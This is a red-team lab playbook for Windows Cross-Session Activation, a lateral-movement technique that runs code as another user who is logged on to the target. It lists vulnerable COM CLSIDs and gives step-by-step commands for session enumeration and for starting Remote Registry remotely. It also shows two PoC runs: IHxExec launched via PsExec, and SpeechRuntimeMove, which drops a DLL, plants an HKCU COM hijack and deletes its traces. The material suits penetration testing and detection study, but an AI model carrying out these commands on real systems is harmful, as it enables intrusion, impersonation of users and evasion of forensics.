# Cross-Session Activation — Playbook Notes

## Lab tests

| Test | CLSID / App | In PermissionHunter list? | PoC | Status |
|------|-------------|---------------------------|-----|--------|
| **Test-1** | HelpPane / IHxHelpPaneServer `{8cec58ae-07a1-11d9-b15e-000d56bfe6ee}` | No | IHxExec | Completed — calc in victim Session 3 |
| **Test-2** | Speech Runtime COM `{38FE8DFE-B129-452B-A215-119382B89E3D}` | Yes | SpeechRuntimeMove | Next |

---

## Step 1: COM Objects Enumeration

**Goal:** Find COM classes that can be used for Cross-Session Activation.

**Must-have conditions:**
- `RunAs = Interactive User`
- Launch/Activation permissions allow the attacker (preferably Remote Activation)
- COM interface has useful methods for code execution

**Tool:**
```
PermissionHunter.exe -outfile result -outformat xlsx
```
(from COMThanasia)

**Required permission:** Run as **Administrator** (elevated).  
Why: Needs full read of `HKLM\SOFTWARE\Classes\AppID` / `CLSID` and Launch/Access permission ACLs. Standard user gets incomplete results.

**Filter results for:**
- RunAs = Interactive User
- LaunchAccess = Remote Activation
- LaunchPrincipal = Everyone / Administrators / Empty

**Common useful CLSIDs:**
- Speech Runtime → `{38FE8DFE-B129-452B-A215-119382B89E3D}`
- sppui → `{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}`
- HelpPane / IHxHelpPaneServer
- Auth UI CredUI

**Note:** Not every Interactive User CLSID is usable — the interface must support useful methods.

### Filtered Candidates (from PermissionHunter)

| Application ID | Application Name | Run As | Launch Access | Launch Principal | Launch Type | Access Principal | Auth Level | Imp Level | CLSIDs |
|----------------|------------------|--------|---------------|------------------|-------------|---------------|------------|-----------|--------|
| {924DC564-16A6-42EB-929A-9A61FA7DA06F} | Authentication UI CredUI Out of Proc Helper for Non-AppContainer Clients | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed | NT AUTHORITY\SYSTEM |  |  | {924DC564-16A6-42EB-929A-9A61FA7DA06F} |
| {B8C54A54-355E-11D3-83EB-00A0C92A2F2D} | Windows Media Player | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | Everyone | AccessDenied | NT AUTHORITY\SELF |  |  | {91778246-9BE4-4713-A651-E833B853CC30} |
| {1111A26D-EF95-4A45-9F55-21E52ADF9887} | MpUx Agent Host | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed | BUILTIN\Administrators |  |  |  |
| {1725704B-A716-4E04-8EF6-87ED4F0A180A} | Speech Runtime COM | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed | NT AUTHORITY\SYSTEM |  |  | {03DE7B30-9300-4FA9-AF69-BA09497107A2}; {265b1075-d22b-41eb-bc97-87568f3e6dab}; {38FE8DFE-B129-452B-A215-119382B89E3D}; {58598185-CF77-4407-B011-0C8282EF681F}; {9663C85F-3C7B-4E02-97AD-906E135500DC}; {D7FD466D-F6CF-4C8E-86DD-12E9B0FDAE48}; {EDA59C23-FCB4-44AF-BFE0-3708C08A212D} |
| {1D278EEF-5C38-4F2A-8C7D-D5C13B662567} | Security Health Agent Host | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed | BUILTIN\Administrators |  |  |  |
| {2A81FE91-95D7-487E-BBF8-B03308E54207} |  | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation |  | AccessAllowed |  |  |  |  |
| {2A81FE91-95D7-487E-BBF8-B03308E54207} |  | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed | NT AUTHORITY\SYSTEM |  |  |  |
| {362cc086-4d81-4824-bbb5-666d34b3197d} | Windows Push Notification Platform | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed |  |  |  |  |
| {37399c92-dc3f-4b55-ae5b-811ee82398ad} | AppServiceContainerBroker | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed |  |  |  | {37399c92-dc3f-4b55-ae5b-811ee82398ad} |
| {4839DDB7-58C2-48F5-8283-E1D1807D0D7D} | ShellServiceHost | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed |  |  |  |  |
| {59c7f6ec-7d18-412f-a68e-877982768e61} | Authentication UI Terminal Services Bump Dialog | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed | NT AUTHORITY\NETWORK SERVICE |  |  |  |
| {7E55A26D-EF95-4A45-9F55-21E52ADF9878} | Security Health Agent Host | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed | BUILTIN\Administrators |  |  |  |
| {924DC564-16A6-42EB-929A-9A61FA7DA06F} | Authentication UI CredUI Out of Proc Helper for Non-AppContainer Clients | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed | NT AUTHORITY\SYSTEM |  |  | {924DC564-16A6-42EB-929A-9A61FA7DA06F} |
| {a463fcb9-6b1c-4e0d-a80b-a2ca7999e25d} |  | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed | NT AUTHORITY\SELF |  |  | {a463fcb9-6b1c-4e0d-a80b-a2ca7999e25d} |
| {b21858c6-9711-4257-99c8-5c0084bebce1} | DockInterface COM server | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed | BUILTIN\Administrators |  |  |  |
| {B8C54A54-355E-11D3-83EB-00A0C92A2F2D} | Windows Media Player | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | Everyone | AccessDenied | NT AUTHORITY\SELF |  |  | {91778246-9BE4-4713-A651-E833B853CC30} |
| {f59bbec1-0907-4464-b04d-1da329585370} | ActivatableApplicationRegistrar | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed |  |  |  | {dea794e0-1c1d-4363-b171-98d0b1703586} |

**Recommended first targets from this scan:**
1. Speech Runtime — `{38FE8DFE-B129-452B-A215-119382B89E3D}` (**Test-2**)
2. Auth UI CredUI — `{924DC564-16A6-42EB-929A-9A61FA7DA06F}`

### Workaround: public PoC is HelpPane, but HelpPane was not in the list (Test-1)

The public PoC used for **Test-1** (**IHxExec**) is built on HelpPane / IHxHelpPaneServer (`{8cec58ae-07a1-11d9-b15e-000d56bfe6ee}`). That CLSID did **not** appear in the PermissionHunter output above.

That is not a contradiction. PermissionHunter was filtered for objects that allow **RemoteLaunch / RemoteActivation** as Interactive User. IHxExec does not need that path. The workaround was:

1. Copy `IHxExec.exe` to the victim (`G-Research-01`, `C:\Temp`).
2. Run it **on the victim** as **SYSTEM** with PsExec (`-s`), not as a remote `CoCreateInstanceEx` from the attacker.
3. Pass the Active session ID (`-s 3`) so COM activates HelpPane in the victim RDP session.
4. Call `IHxHelpPaneServer::Execute()` to start `calc.exe` in that session.

Technically this is still Cross-Session Activation: an elevated process calls `ISpecialSystemProperties::SetSessionId`, then creates an Interactive User COM server in another session. The difference is the **activation origin**. Remote DCOM would be checked against the RemoteLaunch ACL that produced the table. Local SYSTEM activation is checked against local launch rights, which SYSTEM has. HelpPane can therefore be missing from a remote-activation filter and still work when the PoC is delivered and executed on the host.

HelpPane was also the only well-documented interface in this set with a direct command-execution method (`Execute()`). Objects in the table prove ACL fit; they do not automatically expose an equivalent method. After Test-1 confirmed CSA (Session 3, calc as victim), **Test-2** uses Speech Runtime, which **is** in the scan.

---

## Step 2: Session Enumeration

**Requirement:** Cross-Session Activation requires an active interactive user session on the target. In this test an RDP session was used so the victim account remained in an Active state, which was then enumerated on the victim machine before activation.

**Goal:** Identify active interactive sessions and their Session IDs on the target.

**Command (from attacker):**
```bash
quser /server:<TARGET-IP>
```

**Example:**
```bash
quser /server:10.110.0.101
```

**Sample output:**
```
USERNAME              SESSIONNAME        ID  STATE
victim                rdp-tcp#0          3  Active
```

**Notes:**
- Only sessions in **Active** state are reliable targets.
- Session IDs are local to each machine (not unique across the domain).
- Disconnected (Disc) sessions are less reliable for CSA.

---

## Step 3: Remote Registry

**Why it is critical:**  
Remote Registry is required for remote COM hijacking and for many remote CSA tooling paths. It allows the attacker to read/write registry keys on the target (for example to plant COM hijacks under the victim user’s HKCU or to inspect AppID/CLSID permissions). Without it, pure remote registry-based steps fail even if DCOM activation itself works.

**Check status (from attacker):**
```bash
sc \\10.110.0.101 query RemoteRegistry
```

**Start the service:**
```bash
sc \\10.110.0.101 start RemoteRegistry
```

**Enable automatic start (optional):**
```bash
sc \\10.110.0.101 config RemoteRegistry start= auto
sc \\10.110.0.101 start RemoteRegistry
```

**Note:** When using PsExec to run a local PoC already on the target, Remote Registry is less critical. It becomes essential for remote COM hijack + SpeechRuntimeMove-style attacks.

---

## Test-1: IHxExec (HelpPane PoC)

**What it does:**  
IHxExec uses the IHxHelpPaneServer COM object (`RunAs = Interactive User`) to perform Cross-Session Activation. It calls `SetSessionId` then activates the COM class in the target session and invokes `Execute()` to run an arbitrary binary in the victim user’s context.

The public PoC is HelpPane-based. HelpPane was not in the PermissionHunter list, so the workaround was to run IHxExec locally as SYSTEM on the victim (PsExec) instead of depending on remote DCOM ACLs.

**Transfer to victim machine:**  
Copy IHxExec.exe to the target (e.g. `C:\Temp\IHxExec.exe`).

```bash
copy IHxExec.exe \\10.110.0.101\C$\Temp\
```

**Execute with admin privileges (from attacker via PsExec):**
```bash
psexec \\10.110.0.101 -accepteula -s C:\Temp\IHxExec.exe -s <SessionID> -c C:\Windows\System32\calc.exe
```

**Example (Session 3 = victim Active session):**
```bash
psexec \\10.110.0.101 -accepteula -s C:\Temp\IHxExec.exe -s 3 -c C:\Windows\System32\calc.exe
```

**Expected result:**  
Admin only **triggers** IHxExec. `calc.exe` runs on the **victim machine** as the **victim user** (Interactive User session). Exit code 0 indicates success.

**Lab observation:**  
When the correct Active Session ID was used, output showed:
```
[+] Executing binary: file:///C:\Windows\System32\calc.exe
error code 0
```

---

## Test-2: Speech Runtime COM (SpeechRuntimeMove)

PoC: [SpeechRuntimeMove](https://github.com/rtecCyberSec/SpeechRuntimeMove)

**What SpeechRuntimeMove.exe does**

- SpeechRuntimeMove is a .NET tool for lateral movement as the logged-on user.
- It combines remote DCOM activation of Speech Runtime with an HKCU COM hijack.
- `mode=enum` lists remote sessions (ID, state, user) via `winsta.dll`.
- `mode=attack` drops a DLL, writes the hijack, triggers SpeechRuntime, then cleans up.
- The trigger CLSID is `{38FE8DFE-B129-452B-A215-119382B89E3D}` (Speech Named Pipe COM).
- Creating that class starts `SpeechRuntime.exe` as Interactive User in the chosen session.
- `SetSessionId` is what forces that session (same CSA idea as IHxExec).
- The hijack CLSID is `{655D9BF9-3876-43D0-B6E8-C83C1224154C}` under the victim’s HKCU.
- Remote Registry writes `InProcServer32` to your DLL path using the user’s SID.
- SpeechRuntime then loads that DLL; `DllMain` runs your command as the victim.
- DLL is copied over SMB to `dllpath` (example: `C:\Windows\Temp\pwned.dll`).
- After ~5 seconds it deletes the registry key, stops Remote Registry, and removes the file.
- Needs admin on the target, Remote Registry, SMB write, and an Active session.
- Unlike IHxExec, this runs from the attacker box and matches the Speech Runtime CLSID in the scan.
- Code runs as the victim user, so you do not need to steal tokens from LSASS.

**Enum:**
```bash
SpeechRuntimeMove.exe mode=enum target=10.110.0.101
```

**Attack (Session 3 = victim):**
```bash
SpeechRuntimeMove.exe mode=attack target=10.110.0.101 dllpath=C:\Windows\Temp\payload.dll session=3 targetuser=green\victim command="cmd.exe /C calc.exe"
```

**Expected result:**  
Attacker triggers from G-Research-02. `calc.exe` (or payload) runs on G-Research-01 **as the victim user**.
